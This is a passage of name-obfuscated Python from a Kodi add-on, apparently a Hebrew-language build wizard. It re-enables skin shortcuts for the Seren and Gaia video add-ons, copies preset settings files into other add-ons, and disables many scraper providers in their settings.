       copyfile (O000000OO0OOOO000 ,O0000O0OO000O0O00 )#line:1172
    except :#line:1174
       pass #line:1175
def rdbuildaddonON ():#line:1182
    OO00OOOOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1184
    with open (OO00OOOOO000O00OO ,'r')as OO0O000OO000O0OOO :#line:1185
      O00OOO0O00OOOOOOO =OO0O000OO000O0OOO .read ()#line:1186
    O00OOO0O00OOOOOOO =O00OOO0O00OOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1204
    with open (OO00OOOOO000O00OO ,'w')as OO0O000OO000O0OOO :#line:1207
      OO0O000OO000O0OOO .write (O00OOO0O00OOOOOOO )#line:1208
    OO00OOOOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1212
    with open (OO00OOOOO000O00OO ,'r')as OO0O000OO000O0OOO :#line:1213
      O00OOO0O00OOOOOOO =OO0O000OO000O0OOO .read ()#line:1214
    O00OOO0O00OOOOOOO =O00OOO0O00OOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1232
    with open (OO00OOOOO000O00OO ,'w')as OO0O000OO000O0OOO :#line:1235
      OO0O000OO000O0OOO .write (O00OOO0O00OOOOOOO )#line:1236
    OO00OOOOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1240
    with open (OO00OOOOO000O00OO ,'r')as OO0O000OO000O0OOO :#line:1241
      O00OOO0O00OOOOOOO =OO0O000OO000O0OOO .read ()#line:1242
    O00OOO0O00OOOOOOO =O00OOO0O00OOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1260
    with open (OO00OOOOO000O00OO ,'w')as OO0O000OO000O0OOO :#line:1263
      OO0O000OO000O0OOO .write (O00OOO0O00OOOOOOO )#line:1264
    OO00OOOOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1268
    with open (OO00OOOOO000O00OO ,'r')as OO0O000OO000O0OOO :#line:1269
      O00OOO0O00OOOOOOO =OO0O000OO000O0OOO .read ()#line:1270
    O00OOO0O00OOOOOOO =O00OOO0O00OOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1288
    with open (OO00OOOOO000O00OO ,'w')as OO0O000OO000O0OOO :#line:1291
      OO0O000OO000O0OOO .write (O00OOO0O00OOOOOOO )#line:1292
    OO00OOOOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1295
    with open (OO00OOOOO000O00OO ,'r')as OO0O000OO000O0OOO :#line:1296
      O00OOO0O00OOOOOOO =OO0O000OO000O0OOO .read ()#line:1297
    O00OOO0O00OOOOOOO =O00OOO0O00OOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1315
    with open (OO00OOOOO000O00OO ,'w')as OO0O000OO000O0OOO :#line:1318
      OO0O000OO000O0OOO .write (O00OOO0O00OOOOOOO )#line:1319
    OO00OOOOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1321
    with open (OO00OOOOO000O00OO ,'r')as OO0O000OO000O0OOO :#line:1322
      O00OOO0O00OOOOOOO =OO0O000OO000O0OOO .read ()#line:1323
    O00OOO0O00OOOOOOO =O00OOO0O00OOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1341
    with open (OO00OOOOO000O00OO ,'w')as OO0O000OO000O0OOO :#line:1344
      OO0O000OO000O0OOO .write (O00OOO0O00OOOOOOO )#line:1345
    OO00OOOOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1347
    with open (OO00OOOOO000O00OO ,'r')as OO0O000OO000O0OOO :#line:1348
      O00OOO0O00OOOOOOO =OO0O000OO000O0OOO .read ()#line:1349
    O00OOO0O00OOOOOOO =O00OOO0O00OOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1367
    with open (OO00OOOOO000O00OO ,'w')as OO0O000OO000O0OOO :#line:1370
      OO0O000OO000O0OOO .write (O00OOO0O00OOOOOOO )#line:1371
    OO00OOOOO000O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1374
    with open (OO00OOOOO000O00OO ,'r')as OO0O000OO000O0OOO :#line:1375
      O00OOO0O00OOOOOOO =OO0O000OO000O0OOO .read ()#line:1376
    O00OOO0O00OOOOOOO =O00OOO0O00OOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1394
    with open (OO00OOOOO000O00OO ,'w')as OO0O000OO000O0OOO :#line:1397
      OO0O000OO000O0OOO .write (O00OOO0O00OOOOOOO )#line:1398
def rdbuildinstallON ():#line:1401
    try :#line:1403
       OO0O000OOOO0OO0O0 =ADDONPATH +"/resources/rd/victory.xml"#line:1404
       O0O0OO00OO0OOOOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1405
       copyfile (OO0O000OOOO0OO0O0 ,O0O0OO00OO0OOOOO0 )#line:1407
       OO0O000OOOO0OO0O0 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1409
       O0O0OO00OO0OOOOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1410
       copyfile (OO0O000OOOO0OO0O0 ,O0O0OO00OO0OOOOO0 )#line:1412
       OO0O000OOOO0OO0O0 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1414
       O0O0OO00OO0OOOOO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1415
       copyfile (OO0O000OOOO0OO0O0 ,O0O0OO00OO0OOOOO0 )#line:1417
       OO0O000OOOO0OO0O0 =ADDONPATH +"/resources/rd/Splash.png"#line:1420
       O0O0OO00OO0OOOOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1421
       copyfile (OO0O000OOOO0OO0O0 ,O0O0OO00OO0OOOOO0 )#line:1423
    except :#line:1425
       pass #line:1426
def rdbuild ():#line:1436
	OO0O0000O0O00O0O0 =(ADDON .getSetting ("auto_rd"))#line:1437
	if OO0O0000O0O00O0O0 =='true':#line:1438
		OOO0O000O0O0O0OOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1439
		OOO0O000O0O0O0OOO .setSetting ('all_t','0')#line:1440
		OOO0O000O0O0O0OOO .setSetting ('rd_menu_enable','false')#line:1441
		OOO0O000O0O0O0OOO .setSetting ('magnet_bay','false')#line:1442
		OOO0O000O0O0O0OOO .setSetting ('magnet_extra','false')#line:1443
		OOO0O000O0O0O0OOO .setSetting ('rd_only','false')#line:1444
		OOO0O000O0O0O0OOO .setSetting ('ftp','false')#line:1446
		OOO0O000O0O0O0OOO .setSetting ('fp','false')#line:1447
		OOO0O000O0O0O0OOO .setSetting ('filter_fp','false')#line:1448
		OOO0O000O0O0O0OOO .setSetting ('fp_size_en','false')#line:1449
		OOO0O000O0O0O0OOO .setSetting ('afdah','false')#line:1450
		OOO0O000O0O0O0OOO .setSetting ('ap2s','false')#line:1451
		OOO0O000O0O0O0OOO .setSetting ('cin','false')#line:1452
		OOO0O000O0O0O0OOO .setSetting ('clv','false')#line:1453
		OOO0O000O0O0O0OOO .setSetting ('cmv','false')#line:1454
		OOO0O000O0O0O0OOO .setSetting ('dl20','false')#line:1455
		OOO0O000O0O0O0OOO .setSetting ('esc','false')#line:1456
		OOO0O000O0O0O0OOO .setSetting ('extra','false')#line:1457
		OOO0O000O0O0O0OOO .setSetting ('film','false')#line:1458
		OOO0O000O0O0O0OOO .setSetting ('fre','false')#line:1459
		OOO0O000O0O0O0OOO .setSetting ('fxy','false')#line:1460
		OOO0O000O0O0O0OOO .setSetting ('genv','false')#line:1461
		OOO0O000O0O0O0OOO .setSetting ('getgo','false')#line:1462
		OOO0O000O0O0O0OOO .setSetting ('gold','false')#line:1463
		OOO0O000O0O0O0OOO .setSetting ('gona','false')#line:1464
		OOO0O000O0O0O0OOO .setSetting ('hdmm','false')#line:1465
		OOO0O000O0O0O0OOO .setSetting ('hdt','false')#line:1466
		OOO0O000O0O0O0OOO .setSetting ('icy','false')#line:1467
		OOO0O000O0O0O0OOO .setSetting ('ind','false')#line:1468
		OOO0O000O0O0O0OOO .setSetting ('iwi','false')#line:1469
		OOO0O000O0O0O0OOO .setSetting ('jen_free','false')#line:1470
		OOO0O000O0O0O0OOO .setSetting ('kiss','false')#line:1471
		OOO0O000O0O0O0OOO .setSetting ('lavin','false')#line:1472
		OOO0O000O0O0O0OOO .setSetting ('los','false')#line:1473
		OOO0O000O0O0O0OOO .setSetting ('m4u','false')#line:1474
		OOO0O000O0O0O0OOO .setSetting ('mesh','false')#line:1475
		OOO0O000O0O0O0OOO .setSetting ('mf','false')#line:1476
		OOO0O000O0O0O0OOO .setSetting ('mkvc','false')#line:1477
		OOO0O000O0O0O0OOO .setSetting ('mjy','false')#line:1478
		OOO0O000O0O0O0OOO .setSetting ('hdonline','false')#line:1479
		OOO0O000O0O0O0OOO .setSetting ('moviex','false')#line:1480
		OOO0O000O0O0O0OOO .setSetting ('mpr','false')#line:1481
		OOO0O000O0O0O0OOO .setSetting ('mvg','false')#line:1482
		OOO0O000O0O0O0OOO .setSetting ('mvl','false')#line:1483
		OOO0O000O0O0O0OOO .setSetting ('mvs','false')#line:1484
		OOO0O000O0O0O0OOO .setSetting ('myeg','false')#line:1485
		OOO0O000O0O0O0OOO .setSetting ('ninja','false')#line:1486
		OOO0O000O0O0O0OOO .setSetting ('odb','false')#line:1487
		OOO0O000O0O0O0OOO .setSetting ('ophd','false')#line:1488
		OOO0O000O0O0O0OOO .setSetting ('pks','false')#line:1489
		OOO0O000O0O0O0OOO .setSetting ('prf','false')#line:1490
		OOO0O000O0O0O0OOO .setSetting ('put18','false')#line:1491
		OOO0O000O0O0O0OOO .setSetting ('req','false')#line:1492
		OOO0O000O0O0O0OOO .setSetting ('rftv','false')#line:1493
		OOO0O000O0O0O0OOO .setSetting ('rltv','false')#line:1494
		OOO0O000O0O0O0OOO .setSetting ('sc','false')#line:1495
		OOO0O000O0O0O0OOO .setSetting ('seehd','false')#line:1496
		OOO0O000O0O0O0OOO .setSetting ('showbox','false')#line:1497
		OOO0O000O0O0O0OOO .setSetting ('shuid','false')#line:1498
		OOO0O000O0O0O0OOO .setSetting ('sil_gh','false')#line:1499
		OOO0O000O0O0O0OOO .setSetting ('spv','false')#line:1500
		OOO0O000O0O0O0OOO .setSetting ('subs','false')#line:1501
		OOO0O000O0O0O0OOO .setSetting ('tvs','false')#line:1502
		OOO0O000O0O0O0OOO .setSetting ('tw','false')#line:1503
		OOO0O000O0O0O0OOO .setSetting ('upto','false')#line:1504
		OOO0O000O0O0O0OOO .setSetting ('vel','false')#line:1505
		OOO0O000O0O0O0OOO .setSetting ('vex','false')#line:1506
		OOO0O000O0O0O0OOO .setSetting ('vidc','false')#line:1507
		OOO0O000O0O0O0OOO .setSetting ('w4hd','false')#line:1508
		OOO0O000O0O0O0OOO .setSetting ('wav','false')#line:1509
		OOO0O000O0O0O0OOO .setSetting ('wf','false')#line:1510
		OOO0O000O0O0O0OOO .setSetting ('wse','false')#line:1511
		OOO0O000O0O0O0OOO .setSetting ('wss','false')#line:1512
		OOO0O000O0O0O0OOO .setSetting ('wsse','false')#line:1513
		OOO0O000O0O0O0OOO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1514
		OOO0O000O0O0O0OOO .setSetting ('debrid.only','true')#line:1515
		OOO0O000O0O0O0OOO .setSetting ('hosts.captcha','false')#line:1516
		OOO0O000O0O0O0OOO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1517
		OOO0O000O0O0O0OOO .setSetting ('provider.123moviehd','false')#line:1518
		OOO0O000O0O0O0OOO .setSetting ('provider.300mbdownload','false')#line:1519
		OOO0O000O0O0O0OOO .setSetting ('provider.alltube','false')#line:1520
		OOO0O000O0O0O0OOO .setSetting ('provider.allucde','false')#line:1521
		OOO0O000O0O0O0OOO .setSetting ('provider.animebase','false')#line:1522
		OOO0O000O0O0O0OOO .setSetting ('provider.animeloads','false')#line:1523
		OOO0O000O0O0O0OOO .setSetting ('provider.animetoon','false')#line:1524
		OOO0O000O0O0O0OOO .setSetting ('provider.bnwmovies','false')#line:1525
		OOO0O000O0O0O0OOO .setSetting ('provider.boxfilm','false')#line:1526
		OOO0O000O0O0O0OOO .setSetting ('provider.bs','false')#line:1527
		OOO0O000O0O0O0OOO .setSetting ('provider.cartoonhd','false')#line:1528
		OOO0O000O0O0O0OOO .setSetting ('provider.cdahd','false')#line:1529
		OOO0O000O0O0O0OOO .setSetting ('provider.cdax','false')#line:1530
		OOO0O000O0O0O0OOO .setSetting ('provider.cine','false')#line:1531
		OOO0O000O0O0O0OOO .setSetting ('provider.cinenator','false')#line:1532
		OOO0O000O0O0O0OOO .setSetting ('provider.cmovieshdbz','false')#line:1533
		OOO0O000O0O0O0OOO .setSetting ('provider.coolmoviezone','false')#line:1534
		OOO0O000O0O0O0OOO .setSetting ('provider.ddl','false')#line:1535
		OOO0O000O0O0O0OOO .setSetting ('provider.deepmovie','false')#line:1536
		OOO0O000O0O0O0OOO .setSetting ('provider.ekinomaniak','false')#line:1537
		OOO0O000O0O0O0OOO .setSetting ('provider.ekinotv','false')#line:1538
		OOO0O000O0O0O0OOO .setSetting ('provider.filiser','false')#line:1539
		OOO0O000O0O0O0OOO .setSetting ('provider.filmpalast','false')#line:1540
		OOO0O000O0O0O0OOO .setSetting ('provider.filmwebbooster','false')#line:1541
		OOO0O000O0O0O0OOO .setSetting ('provider.filmxy','false')#line:1542
		OOO0O000O0O0O0OOO .setSetting ('provider.fmovies','false')#line:1543
		OOO0O000O0O0O0OOO .setSetting ('provider.foxx','false')#line:1544
		OOO0O000O0O0O0OOO .setSetting ('provider.freefmovies','false')#line:1545
		OOO0O000O0O0O0OOO .setSetting ('provider.freeputlocker','false')#line:1546
		OOO0O000O0O0O0OOO .setSetting ('provider.furk','false')#line:1547
		OOO0O000O0O0O0OOO .setSetting ('provider.gamatotv','false')#line:1548
		OOO0O000O0O0O0OOO .setSetting ('provider.gogoanime','false')#line:1549
		OOO0O000O0O0O0OOO .setSetting ('provider.gowatchseries','false')#line:1550
		OOO0O000O0O0O0OOO .setSetting ('provider.hackimdb','false')#line:1551
		OOO0O000O0O0O0OOO .setSetting ('provider.hdfilme','false')#line:1552
		OOO0O000O0O0O0OOO .setSetting ('provider.hdmto','false')#line:1553
		OOO0O000O0O0O0OOO .setSetting ('provider.hdpopcorns','false')#line:1554
		OOO0O000O0O0O0OOO .setSetting ('provider.hdstreams','false')#line:1555
		OOO0O000O0O0O0OOO .setSetting ('provider.horrorkino','false')#line:1557
		OOO0O000O0O0O0OOO .setSetting ('provider.iitv','false')#line:1558
		OOO0O000O0O0O0OOO .setSetting ('provider.iload','false')#line:1559
		OOO0O000O0O0O0OOO .setSetting ('provider.iwaatch','false')#line:1560
		OOO0O000O0O0O0OOO .setSetting ('provider.kinodogs','false')#line:1561
		OOO0O000O0O0O0OOO .setSetting ('provider.kinoking','false')#line:1562
		OOO0O000O0O0O0OOO .setSetting ('provider.kinow','false')#line:1563
		OOO0O000O0O0O0OOO .setSetting ('provider.kinox','false')#line:1564
		OOO0O000O0O0O0OOO .setSetting ('provider.lichtspielhaus','false')#line:1565
		OOO0O000O0O0O0OOO .setSetting ('provider.liomenoi','false')#line:1566
		OOO0O000O0O0O0OOO .setSetting ('provider.magnetdl','false')#line:1569
		OOO0O000O0O0O0OOO .setSetting ('provider.megapelistv','false')#line:1570
		OOO0O000O0O0O0OOO .setSetting ('provider.movie2k-ac','false')#line:1571
		OOO0O000O0O0O0OOO .setSetting ('provider.movie2k-ag','false')#line:1572
		OOO0O000O0O0O0OOO .setSetting ('provider.movie2z','false')#line:1573
		OOO0O000O0O0O0OOO .setSetting ('provider.movie4k','false')#line:1574
		OOO0O000O0O0O0OOO .setSetting ('provider.movie4kis','false')#line:1575
		OOO0O000O0O0O0OOO .setSetting ('provider.movieneo','false')#line:1576
		OOO0O000O0O0O0OOO .setSetting ('provider.moviesever','false')#line:1577
		OOO0O000O0O0O0OOO .setSetting ('provider.movietown','false')#line:1578
		OOO0O000O0O0O0OOO .setSetting ('provider.mvrls','false')#line:1580
		OOO0O000O0O0O0OOO .setSetting ('provider.netzkino','false')#line:1581
		OOO0O000O0O0O0OOO .setSetting ('provider.odb','false')#line:1582
		OOO0O000O0O0O0OOO .setSetting ('provider.openkatalog','false')#line:1583
		OOO0O000O0O0O0OOO .setSetting ('provider.ororo','false')#line:1584
		OOO0O000O0O0O0OOO .setSetting ('provider.paczamy','false')#line:1585
		OOO0O000O0O0O0OOO .setSetting ('provider.peliculasdk','false')#line:1586
		OOO0O000O0O0O0OOO .setSetting ('provider.pelisplustv','false')#line:1587
		OOO0O000O0O0O0OOO .setSetting ('provider.pepecine','false')#line:1588
		OOO0O000O0O0O0OOO .setSetting ('provider.primewire','false')#line:1589
		OOO0O000O0O0O0OOO .setSetting ('provider.projectfreetv','false')#line:1590
		OOO0O000O0O0O0OOO .setSetting ('provider.proxer','false')#line:1591
		OOO0O000O0O0O0OOO .setSetting ('provider.pureanime','false')#line:1592
		OOO0O000O0O0O0OOO .setSetting ('provider.putlocker','false')#line:1593
		OOO0O000O0O0O0OOO .setSetting ('provider.putlockerfree','false')#line:1594
		OOO0O000O0O0O0OOO .setSetting ('provider.reddit','false')#line:1595
		OOO0O000O0O0O0OOO .setSetting ('provider.cartoonwire','false')#line:1596
		OOO0O000O0O0O0OOO .setSetting ('provider.seehd','false')#line:1597
		OOO0O000O0O0O0OOO .setSetting ('provider.segos','false')#line:1598
		OOO0O000O0O0O0OOO .setSetting ('provider.serienstream','false')#line:1599
		OOO0O000O0O0O0OOO .setSetting ('provider.series9','false')#line:1600
		OOO0O000O0O0O0OOO .setSetting ('provider.seriesever','false')#line:1601
		OOO0O000O0O0O0OOO .setSetting ('provider.seriesonline','false')#line:1602
		OOO0O000O0O0O0OOO .setSetting ('provider.seriespapaya','false')#line:1603
		OOO0O000O0O0O0OOO .setSetting ('provider.sezonlukdizi','false')#line:1604
		OOO0O000O0O0O0OOO .setSetting ('provider.solarmovie','false')#line:1605
		OOO0O000O0O0O0OOO .setSetting ('provider.solarmoviez','false')#line:1606
		OOO0O000O0O0O0OOO .setSetting ('provider.stream-to','false')#line:1607
		OOO0O000O0O0O0OOO .setSetting ('provider.streamdream','false')#line:1608
		OOO0O000O0O0O0OOO .setSetting ('provider.streamflix','false')#line:1609
		OOO0O000O0O0O0OOO .setSetting ('provider.streamit','false')#line:1610
		OOO0O000O0O0O0OOO .setSetting ('provider.swatchseries','false')#line:1611
		OOO0O000O0O0O0OOO .setSetting ('provider.szukajkatv','false')#line:1612
		OOO0O000O0O0O0OOO .setSetting ('provider.tainiesonline','false')#line:1613
		OOO0O000O0O0O0OOO .setSetting ('provider.tainiomania','false')#line:1614
		OOO0O000O0O0O0OOO .setSetting ('provider.tata','false')#line:1617
		OOO0O000O0O0O0OOO .setSetting ('provider.trt','false')#line:1618
		OOO0O000O0O0O0OOO .setSetting ('provider.tvbox','false')#line:1619
		OOO0O000O0O0O0OOO .setSetting ('provider.ultrahd','false')#line:1620
		OOO0O000O0O0O0OOO .setSetting ('provider.video4k','false')#line:1621
		OOO0O000O0O0O0OOO .setSetting ('provider.vidics','false')#line:1622
		OOO0O000O0O0O0OOO .setSetting ('provider.view4u','false')#line:1623
		OOO0O000O0O0O0OOO .setSetting ('provider.watchseries','false')#line:1624
		OOO0O000O0O0O0OOO .setSetting ('provider.xrysoi','false')#line:1625
		OOO0O000O0O0O0OOO .setSetting ('provider.library','false')#line:1626
def fixfont ():#line:1629
	O00OO00OOOOO000O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1630
	OOOO00O0OO00OOO00 =json .loads (O00OO00OOOOO000O0 );#line:1632
	O0O0OO00OO000OOOO =OOOO00O0OO00OOO00 ["result"]["settings"]#line:1633
	O0O000OOOO0O00OOO =[OOOO00O0000000OOO for OOOO00O0000000OOO in O0O0OO00OO000OOOO if OOOO00O0000000OOO ["id"]=="audiooutput.audiodevice"][0 ]#line:1635
	O00O0OOOO0OO0OO00 =O0O000OOOO0O00OOO ["options"];#line:1636
	OOO000O0OOO0000O0 =O0O000OOOO0O00OOO ["value"];#line:1637
	OO00OOOOO00O00000 =[O00O0O0000O0000OO for (O00O0O0000O0000OO ,OO0000O00O0000O0O )in enumerate (O00O0OOOO0OO0OO00 )if OO0000O00O0000O0O ["value"]==OOO000O0OOO0000O0 ][0 ];#line:1639
	O0O0O0OO00OO00O00 =(OO00OOOOO00O00000 +1 )%len (O00O0OOOO0OO0OO00 )#line:1641
	O0O0O0000OO000O0O =O00O0OOOO0OO0OO00 [O0O0O0OO00OO00O00 ]["value"]#line:1643
	OOOO0OOO0O0O0OO00 =O00O0OOOO0OO0OO00 [O0O0O0OO00OO00O00 ]["label"]#line:1644
	OO0OOOO00O00OO0OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1646
	try :#line:1648
		O00O00OOO0000OO0O =json .loads (OO0OOOO00O00OO0OO );#line:1649
		if O00O00OOO0000OO0O ["result"]!=True :#line:1651
			raise Exception #line:1652
	except :#line:1653
		sys .stderr .write ("Error switching audio output device")#line:1654
		raise Exception #line:1655
def parseDOM2 (O0OOO0OO000OOOO00 ,name =u"",attrs ={},ret =False ):#line:1656
	if isinstance (O0OOO0OO000OOOO00 ,str ):#line:1659
		try :#line:1660
			O0OOO0OO000OOOO00 =[O0OOO0OO000OOOO00 .decode ("utf-8")]#line:1661
		except :#line:1662
			O0OOO0OO000OOOO00 =[O0OOO0OO000OOOO00 ]#line:1663
	elif isinstance (O0OOO0OO000OOOO00 ,unicode ):#line:1664
		O0OOO0OO000OOOO00 =[O0OOO0OO000OOOO00 ]#line:1665
	elif not isinstance (O0OOO0OO000OOOO00 ,list ):#line:1666
		return u""#line:1667
	if not name .strip ():#line:1669
		return u""#line:1670
	O0OOOOOOOO00000OO =[]#line:1672
	for O00O0000000O00O00 in O0OOO0OO000OOOO00 :#line:1673
		OO0O0OO0OOO000OO0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O00O0000000O00O00 )#line:1674
		for OO0O00OO00O000000 in OO0O0OO0OOO000OO0 :#line:1675
			O00O0000000O00O00 =O00O0000000O00O00 .replace (OO0O00OO00O000000 ,OO0O00OO00O000000 .replace ("\n"," "))#line:1676
		O00OOO000OO00O0OO =[]#line:1678
		for O0OO0O00000O000OO in attrs :#line:1679
			OOOO00O0OOOOOO00O =re .compile ('(<'+name +'[^>]*?(?:'+O0OO0O00000O000OO +'=[\'"]'+attrs [O0OO0O00000O000OO ]+'[\'"].*?>))',re .M |re .S ).findall (O00O0000000O00O00 )#line:1680
			if len (OOOO00O0OOOOOO00O )==0 and attrs [O0OO0O00000O000OO ].find (" ")==-1 :#line:1681
				OOOO00O0OOOOOO00O =re .compile ('(<'+name +'[^>]*?(?:'+O0OO0O00000O000OO +'='+attrs [O0OO0O00000O000OO ]+'.*?>))',re .M |re .S ).findall (O00O0000000O00O00 )#line:1682
			if len (O00OOO000OO00O0OO )==0 :#line:1684
				O00OOO000OO00O0OO =OOOO00O0OOOOOO00O #line:1685
				OOOO00O0OOOOOO00O =[]#line:1686
			else :#line:1687
				OO0O00OO0000OO00O =range (len (O00OOO000OO00O0OO ))#line:1688
				OO0O00OO0000OO00O .reverse ()#line:1689
				for OO0O0O0000O000000 in OO0O00OO0000OO00O :#line:1690
					if not O00OOO000OO00O0OO [OO0O0O0000O000000 ]in OOOO00O0OOOOOO00O :#line:1691
						del (O00OOO000OO00O0OO [OO0O0O0000O000000 ])#line:1692
		if len (O00OOO000OO00O0OO )==0 and attrs =={}:#line:1694
			O00OOO000OO00O0OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O00O0000000O00O00 )#line:1695
			if len (O00OOO000OO00O0OO )==0 :#line:1696
				O00OOO000OO00O0OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O00O0000000O00O00 )#line:1697
		if isinstance (ret ,str ):#line:1699
